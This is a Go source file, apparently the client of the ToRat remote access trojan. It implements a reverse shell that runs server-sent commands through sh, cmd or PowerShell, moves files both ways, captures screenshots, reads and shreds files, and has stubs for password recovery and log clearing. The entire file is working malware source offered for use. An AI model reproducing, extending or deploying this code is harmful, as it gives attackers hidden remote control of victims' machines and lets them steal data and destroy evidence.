package client

import (
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/lu4p/ToRat/torat_client/crypto"
	"github.com/lu4p/ToRat/torat_client/screen"
	"github.com/lu4p/cat"
	"github.com/lu4p/shred"
)

func ls(path string) string {
	files, err := filepath.Glob("*")
	if err != nil {
		files[0] = "failed"
	}
	return strings.Join(files, "/")
}

// shell is the reverse shell which is controlled by the server
func (c *connection) shell() {
	var powershell bool
	for {
		cmdbyte, err := c.recv()
		if err != nil {
			return
		}
		cmd := string(cmdbyte)
		log.Println("New cmd:", cmd)
		cmdsp := strings.SplitN(cmd, " ", 2)
		var output []byte
		out := true

		switch cmdsp[0] {
		case "powershell":
			if runtime.GOOS == "windows" {
				powershell = true
				output = []byte("Shell is now Powershell")
			}
		case "cmd":
			if runtime.GOOS == "windows" {
				powershell = false
				output = []byte("Shell is now Cmd")
			}
		case "hostname":
			output = crypto.GetHostname(HostnamePath, ServerPubKey)
		case "down":
			out = false
			c.sendFile(cmdsp[1])

		case "up":
			out = false
			c.recvFile(cmdsp[1])
		case "cd":
			err := os.Chdir(cmdsp[1])
			if err != nil {
				output = []byte("Could not Change Directory")
			} else {
				cwd, err := os.Getwd()
				if err != nil {
					output = []byte("Unknown")
				} else {
					output = []byte(cwd)
				}
			}
		case "screen":
			output = screen.Take()

		case "ping":
			output = []byte("pong")
		case "cat":
			txt, err := cat.File(cmdsp[1])
			if err != nil {
				output = []byte("Something went wrong could not get txt!")
			} else {
				output = []byte(txt)
			}
		case "reconnect":
			break
		case "lazange":
			// TODO: add password recovery
		case "shred":
			shredconf := shred.Conf{Times: 1, Zeros: true, Remove: false}
			err := shredconf.Path(cmdsp[1])
			if err != nil {
				output = []byte("File(s) could not be shredded")
			} else {
				output = []byte("File(s) are shredded")
			}
		case "shredremove":
			shredconf := shred.Conf{Times: 1, Zeros: true, Remove: true}
			shredconf.Path(cmdsp[1])
			if err != nil {
				output = []byte("File(s) could not be shredded")
			} else {
				output = []byte("File(s) are shredded and deleted")
			}
		case "escape":
			runCmd(cmdsp[1], false)
		case "clearlog":
			// TODO: clear all logs
		case "cwd":
			path, err := os.Getwd()
			if err != nil {
				output = []byte("Unknown")
			} else {
				output = []byte(path)
			}
		case "ls":
			files, err := filepath.Glob("*")
			if err != nil {
				return
			}
			output = []byte(strings.Join(files, ";"))

		default:
			output = runCmd(cmd, powershell)
		}
		if output == nil && out {
			c.sendSt("No output something potentially went wrong!")
		} else {
			c.send(output)
		}
	}
}

func runCmd(cmd string, powershell bool) []byte {
	var osshell string
	if cmd == "" {
		return []byte("Error: No command to execute!")
	}
	var osshellargs []string
	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", cmd}

	} else if runtime.GOOS == "windows" {
		if powershell {
			osshell = "powershell"
			osshellargs = []string{"-Command", cmd}

		} else {
			osshell = "cmd"
			osshellargs = []string{"/C", cmd}
		}
	} else if runtime.GOOS == "darwin" {
		// TODO: Add right strings for Mac OSX
		osshell = ""
		osshellargs = []string{"", cmd}
	}
	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, err := execcmd.Output()
	if err != nil {
		return []byte("err")
	} else if cmdout == nil {
		return []byte("no output!")
	}
	return cmdout

}
